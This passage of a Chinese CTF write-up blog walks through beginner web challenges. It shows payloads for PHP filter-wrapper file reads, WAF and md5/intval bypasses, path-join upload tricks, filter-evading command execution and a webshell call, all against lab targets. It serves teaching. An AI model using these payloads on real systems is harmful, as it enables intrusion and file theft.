<p>有回显，但是显示waf，查了一下是Web应用防护系统，那就说明是有什么过滤的，访问一下源码index.php</p>
<p>使用HackBar给flag传入参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221614172.png" alt="image-20240122161430069"></p>
<p>用CyberChef解读</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221615921.png" alt="image-20240122161545859"></p>
<p>代码首先检查通过 <code>php://input</code> 流读取的 POST 数据的长度是否小于 800 字节。接着，它使用 <code>preg_match</code> 函数检查变量 <code>$path</code> 中是否包含字符串 “flag”，若两个条件都满足，脚本输出 ‘nssctf waf!’，所以只要传入的参数长度大于800字节就可以绕过</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630996.png" alt="image-20240122163013873"></p>
<p>解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630694.png" alt="image-20240122163033643"></p>
<p>得到flag</p>

        <h2 id="三十六、-UUCTF-2022-新生赛-websign"   >
          <a href="#三十六、-UUCTF-2022-新生赛-websign" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十六、-UUCTF-2022-新生赛-websign" class="headerlink" title="三十六、[UUCTF 2022 新生赛]websign"></a>三十六、[UUCTF 2022 新生赛]websign</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221633382.png" alt="image-20240122163337319"></p>
<p>那我们就查看源代码，但是鼠标右键和F12都没反应，看来是被禁用了，那直接在URL前面加上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221635386.png" alt="image-20240122163526317"></p>
<p>得到flag</p>

        <h2 id="三十七、-HDCTF-2023-Welcome-To-HDCTF-2023"   >
          <a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="三十七、[HDCTF 2023]Welcome To HDCTF 2023"></a>三十七、[HDCTF 2023]Welcome To HDCTF 2023</h2>
      <p>是一个游戏，死了之后直接弹出弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221643437.png" alt="image-20240122164322298"></p>
<p>提交了发现还真是flag（好突然的）</p>

        <h2 id="三十八、-NSSCTF-2022-Spring-Recruit-babyphp"   >
          <a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="三十八、[NSSCTF 2022 Spring Recruit]babyphp"></a>三十八、[NSSCTF 2022 Spring Recruit]babyphp</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221653532.png" alt="image-20240122165356442"></p>
<p>阅读代码可知，要想获得flag，检查 POST 数据中的 <code>a</code> 字段，要求其不含数字且 <code>intval</code> 后的结果为真；检查 <code>b1</code> 和 <code>b2</code> 字段存在，并且它们不相等，但它们的md5值相等；检查 <code>c1</code> 和 <code>c2</code> 字段不相等，都是字符串类型，且它们的md5值相等</p>

        <h6 id="intval-函数可以获取变量的整数值，常用于强制类型转换"   >
          <a href="#intval-函数可以获取变量的整数值，常用于强制类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#intval-函数可以获取变量的整数值，常用于强制类型转换" class="headerlink" title="intval() 函数可以获取变量的整数值，常用于强制类型转换"></a>intval() 函数可以获取变量的整数值，常用于强制类型转换</h6>
      <p>对于<code>a</code>，这里对<code>a</code>过滤了数字，只能用数组来绕过，因为intval() 函数转换数组类型时，不关心数组中的内容，只判断数组中有没有元素</p>
<p>对于<code>b1</code>和<code>b2</code>，则可以用数组绕过</p>
<p>对于<code>c1</code>和<code>c2</code>，由于这里多了判断是否是字符串，所以不能用数组绕过，只能改用科学计数法绕过，所以传入两个md5加密后结果是0e开头的字符串</p>
<p>所以最终传入：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b1[]=2&amp;b2[]=3&amp;c1=QNKCDZO&amp;c2=s878926199a</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231738376.png" alt="image-20240123173817286"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231741793.png" alt="image-20240123174130710"></p>
<p>得到flag</p>

        <h2 id="三十九、-GDOUCTF-2023-EZ-WEB"   >
          <a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="headerlink" title="三十九、[GDOUCTF 2023]EZ WEB"></a>三十九、[GDOUCTF 2023]EZ WEB</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905361.png" alt="image-20240123190517274"></p>
<p>点击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905885.png" alt="image-20240123190537804"></p>
<p>查看源代码，发现有/src提示，访问/src</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231904983.png" alt="image-20240123190459779"></p>
<p>这段 Python 代码使用 Flask 框架创建了一个简单的 web 应用程序。它定义了三个路由处理函数：</p>
<p>1.<code>index</code>：当用户访问根 URL (<code>/</code>) 时，返回 ‘index.html’ 文件。这通常是网站的主页。</p>
<p>2.<code>source</code>：当用户访问 <code>/src</code> 路径时，返回 ‘app.py’ 文件。</p>
<p>3.<code>flag</code>：定义了一个 PUT 请求的路由 <code>/super-secret-route-nobody-will-guess</code>。这个路由返回 ‘flag’ 文件的内容。</p>
<p>那我们抓包修改请求方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231908926.png" alt="image-20240123190827822"></p>
<p>发送到Repeater，把GET方法修改成PUT，并且内容为/super-secret-route-nobody-will-guess</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909621.png" alt="image-20240123190903564"></p>
<p>发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909520.png" alt="image-20240123190925445"></p>
<p>得到flag</p>

        <h2 id="四十、-GDOUCTF-2023-泄露的伪装"   >
          <a href="#四十、-GDOUCTF-2023-泄露的伪装" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十、-GDOUCTF-2023-泄露的伪装" class="headerlink" title="四十、[GDOUCTF 2023]泄露的伪装"></a>四十、[GDOUCTF 2023]泄露的伪装</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261615869.png" alt="image-20240126161520779"></p>
<p>查看网页源代码啥也没有，使用dirsearch扫描一下</p>
<p>输入命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://node5.anna.nssctf.cn:28437/</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261603852.png" alt="image-20240126160315726"></p>
<p>访问/test.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261602947.png" alt="image-20240126160202829"></p>
<p>使用GET方法传入<code>cxk</code>，如果 <code>cxk</code> 参数存在，代码将尝试读取 <code>cxk</code> 参数指定的文件内容。如果该文件的内容为字符串 “ctrl”，则显示 <code>$flag</code> 变量的内容</p>
<p>访问/<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.rar,下载后有一个txt文件/" >www.rar，下载后有一个txt文件</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261604941.png" alt="image-20240126160456863"></p>
<p>那再访问一下/orzorz.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261606570.png" alt="image-20240126160629484"></p>
<p>算是一个有回显的并且中文正常的，但代码和/test.txt一样</p>
<p>使用php伪协议（Y3RybA==为ctrl字符的base64编码格式）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cxk=data://text/plain;base64,Y3RybA==</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261613312.png" alt="image-20240126161339235"></p>
<p>得到flag</p>

        <h2 id="四十一、-HNCTF-2022-Week1-Interesting-include"   >
          <a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="四十一、[HNCTF 2022 Week1]Interesting_include"></a>四十一、[HNCTF 2022 Week1]Interesting_include</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261632343.png" alt="image-20240126163200256"></p>
<p>使用GET方法传入参数filter，提示说flag在flag.php文件内</p>
<p>使用php伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filter=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261631056.png" alt="image-20240126163120975"></p>
<p>使用CyberChef解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261633350.png" alt="image-20240126163332272"></p>
<p>得到flag</p>

        <h2 id="四十二、-NISACTF-2022-babyupload"   >
          <a href="#四十二、-NISACTF-2022-babyupload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十二、-NISACTF-2022-babyupload" class="headerlink" title="四十二、[NISACTF 2022]babyupload"></a>四十二、[NISACTF 2022]babyupload</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261636508.png" alt="image-20240126163628436"></p>
<p>文件上传题，上传一个图片马test.jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261644751.png" alt="image-20240126164441680"></p>
<p>结果显示不对</p>
<p>看看网页源代码，发现有/source提示，访问一下</p>
<p>下载了压缩包，里面有文件app.py</p>
<p>重点内容:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line"></span><br><span class="line">  if &#x27;file&#x27; not in request.files:</span><br><span class="line"></span><br><span class="line">​    return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">  file = request.files[&#x27;file&#x27;]</span><br><span class="line"></span><br><span class="line">  if &quot;.&quot; in file.filename:</span><br><span class="line"></span><br><span class="line">​    return &quot;Bad filename!&quot;, 403</span><br><span class="line"></span><br><span class="line">  conn = db()</span><br><span class="line"></span><br><span class="line">  cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">  uid = uuid.uuid4().hex</span><br><span class="line"></span><br><span class="line">  try:</span><br><span class="line"></span><br><span class="line">​    cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,))</span><br><span class="line"></span><br><span class="line">  except sqlite3.IntegrityError:</span><br><span class="line"></span><br><span class="line">​    return &quot;Duplicate file&quot;</span><br><span class="line"></span><br><span class="line">  conn.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  file.save(&#x27;uploads/&#x27; + file.filename)</span><br><span class="line"></span><br><span class="line">  return redirect(&#x27;/file/&#x27; + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/file/&lt;id&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">def file(id):</span><br><span class="line"></span><br><span class="line">  conn = db()</span><br><span class="line"></span><br><span class="line">  cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">  cur.execute(&quot;select path from files where id=?&quot;, (id,))</span><br><span class="line"></span><br><span class="line">  res = cur.fetchone()</span><br><span class="line"></span><br><span class="line">  if res is None:</span><br><span class="line"></span><br><span class="line">​    return &quot;File not found&quot;, 404</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  \# print(res[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:</span><br><span class="line"></span><br><span class="line">​    return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">  app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></div></figure>

<p>意思就是文件名中不能有后缀，使用 <code>uuid4</code> 生成唯一文件ID，将文件信息插入数据库，保存文件到 ‘uploads’ 目录</p>
<p><code>os.path.join(&quot;uploads/&quot;, res[0])</code> 这个函数将 “uploads/“ 和 <code>res[0]</code>（从数据库中检索到的文件名）合并成一个完整的文件路径。<code>os.path.join</code> 用于构造路径，这样可以适应不同操作系统的路径规则</p>

        <h6 id="绝对路径拼接漏洞"   >
          <a href="#绝对路径拼接漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#绝对路径拼接漏洞" class="headerlink" title="绝对路径拼接漏洞"></a><em><strong>绝对路径拼接漏洞</strong></em></h6>
      
        <h6 id="os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。"   >
          <a href="#os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。" class="heading-link"><i class="fas fa-link"></i></a><a href="#os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。" class="headerlink" title="*os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。"></a>*os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</h6>
      
        <h6 id="然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径"   >
          <a href="#然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径" class="headerlink" title="然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径"></a>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</h6>
      <p>我们想要访问的是flag文件，因此，当上传的文件名为 /flag ，上传后通过uuid访问文件后，查询到的文件名是 /flag ，那么进行路径拼接时，uploads/ 将被删除，读取到的就是根目录下的 flag 文件。</p>
<p>所以上传一个图片马，抓包后，修改文件名为/flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725871.png" alt="image-20240126172523762"></p>
<p>发送后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725300.png" alt="image-20240126172542233"></p>
<p>有一个链接，关闭burpsuite拦截后访问/file/b08aa4f07f594f9fb9f4c60889a206a</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261726517.png" alt="image-20240126172632448"></p>
<p>得到flag</p>

        <h2 id="四十三、-UUCTF-2022-新生赛-ez-rce"   >
          <a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="四十三、[UUCTF 2022 新生赛]ez_rce"></a>四十三、[UUCTF 2022 新生赛]ez_rce</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291616500.png" alt="image-20240129161604390"></p>
<p>过滤了很多关键字，而且可以看出是无回显类型的，于是可以想到用转义字符，并用<code>var_dump()</code>函数输出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(l\s /);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291314442.png" alt="image-20240129131459366"></p>
<p>不太行，后来得知php中对于输出函数，要给命令加上反引号，才表示执行里面的命令，不加就只是输出字符串（可编代码尝试）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138296.png"></p>
<p>加上反引号后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138703.png" alt="image-20240130113847636"></p>
<p>所以输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(`l\s%20/`);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291306199.png" alt="image-20240129130626055"></p>
<p>欧，有了，现在打开fffffffffflagafag文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(`c\at%20/ffffffffffl\agafag`);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291614614.png" alt="image-20240129161452515"></p>
<p>得到flag</p>

        <h6 id="RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0"   >
          <a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="headerlink" title="RCE各种绕过总结：https://zhuanlan.zhihu.com/p/391439312?utm_id=0"></a>RCE各种绕过总结：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/391439312?utm_id=0" >https://zhuanlan.zhihu.com/p/391439312?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h2 id="四十四、-SWPUCTF-2022-新生赛-Ez-upload"   >
          <a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="四十四、[SWPUCTF 2022 新生赛]Ez_upload"></a>四十四、[SWPUCTF 2022 新生赛]Ez_upload</h2>
      <p>同[GXYCTF2019]BabyUpload 1</p>
<p>不过最后的flag在蚁剑里没找到，文件上传后访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/7d0551daade57740c3ca7319cc7065e4/test.jpg?shell=phpinfo();</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401311451545.png" alt="image-20240131145123394"></p>
<p>得到flag</p>

        <h2 id="四十五、-HNCTF-2022-Week1-easy-html"   >
          <a href="#四十五、-HNCTF-2022-Week1-easy-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十五、-HNCTF-2022-Week1-easy-html" class="headerlink" title="四十五、[HNCTF 2022 Week1]easy_html"></a>四十五、[HNCTF 2022 Week1]easy_html</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443662.png" alt="image-20240201144308620"></p>
<p>饼干，英文为cookie，抓包看看cookie的值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443690.png" alt="image-20240201144347649"></p>
<p>访问一下这个/f14g.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444568.png" alt="image-20240201144410527"></p>
<p>随便输入11个数字试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444960.png" alt="image-20240201144447919"></p>
<p>不对，而且只能输入10个字符，查看网页源代码发现是限制了字符的长度，按F12修改为11位试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011446766.png" alt="image-20240201144629715"></p>
<p>再重新输入十一个数字，点击登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011442912.png" alt="image-20240201144247804"></p>
<p>获得flag</p>

        <h2 id="四十六、-羊城杯-2020-easycon"   >
          <a href="#四十六、-羊城杯-2020-easycon" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十六、-羊城杯-2020-easycon" class="headerlink" title="四十六、[羊城杯 2020]easycon"></a>四十六、[羊城杯 2020]easycon</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330390.png" alt="image-20240202133033288"></p>
<p>奇奇怪怪，访问一下/index.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021332931.png" alt="image-20240202133202886"></p>
<p>意思就是使用POST方法传入参数cmd</p>
<p>先直接传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021333592.png" alt="image-20240202133343499"></p>
<p>没什么可疑的，再看看当前目录的文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls&quot;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021353025.png" alt="image-20240202135344980"></p>
<p>gw.jpg和gw2.jpg都是网页的图片，bbbbbbbbb.txt有点可疑</p>
<p>打开/bbbbbbbbb.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021327077.png" alt="image-20240202132735859"></p>
<p>看到最后是一个“＝”符号，猜测是base64编码，拿到CyberChef解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021328284.png" alt="image-20240202132843214"></p>
<p>有一个”JFIF”，表明这是一个图像文件的base64编码</p>
<p>那么将它的解密输出成一个jpg格式的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330448.png" alt="image-20240202133002278"></p>
<p>得到flag</p>

        <h2 id="四十七、-GDOUCTF-2023-受不了一点"   >
          <a href="#四十七、-GDOUCTF-2023-受不了一点" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十七、-GDOUCTF-2023-受不了一点" class="headerlink" title="四十七、[GDOUCTF 2023]受不了一点"></a>四十七、[GDOUCTF 2023]受不了一点</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021447505.png" alt="image-20240202144743440"></p>
<p>阅读代码</p>
<p>①用POST方法传入“ctf”和”gdou“变量，并且这两个变量的md5值相同，没有过滤函数，因此可以用数组绕过</p>
<p>②设置Cookie的值为cookie=j0k3r</p>
<p>③使用GET方法传入”aaa”和”bbb”变量，并且这两个变量都要为114514（弱比较），但又不能完全相同，因此给一个变量的值后面随便加一个字母即可</p>
<p>④若同时使用GET方法和POST方法传入”flag”变量，则返回’cancanwordflag’，若只用一种方法传入且值为‘flag’时，则返回’hacker!’。</p>
<p><em>使用两个<code>foreach</code>循环遍历<code>$_POST</code>和<code>$_GET</code>数组，$$key用于创建与数组键名相同的变量，变量值为数组的值。</em></p>
<p><em><code>$key</code>和<code>$value</code>分别代表数组元素的键和值。每次循环，<code>$key</code>和<code>$value</code>会被分别赋值为当前数组元素的键和值。最后，代码输出<code>$flag</code>的值。但是前面并没有设定flag结合foreach循环和前面判断语句的含义，这里是要传参一个flag=flag才回回显最终的flag信息，但是这里有对flag的传参进行了限制，但是也只对flag的传参进行了限制</em></p>
<p><em>也就是说，对于其他变量的传参并没有做任何限制，那么我们可以先将另一个变量的参数设置为flag，再赋值给flag变量作为flag变量的参数</em></p>
<p>所以最终为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021457716.png" alt="image-20240202145746656"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021458001.png" alt="image-20240202145800970"></p>
<p>得到flag</p>

        <h2 id="四十八、-SWPUCTF-2022-新生赛-奇妙的MD5"   >
          <a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="四十八、[SWPUCTF 2022 新生赛]奇妙的MD5"></a>四十八、[SWPUCTF 2022 新生赛]奇妙的MD5</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041134435.png" alt="image-20240204113428318"></p>
<p>查看网页源代码没啥线索，抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041136204.png" alt="image-20240204113616165"></p>
<p>又是这个语句，输入ffifdyop</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041139232.png" alt="image-20240204113942174"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041140043.png" alt="image-20240204114004010"></p>
<p>用GET方法传入x和y，值不能相同但是md5值要相同，可以用数组绕过</p>
<p>构造payload:</p>
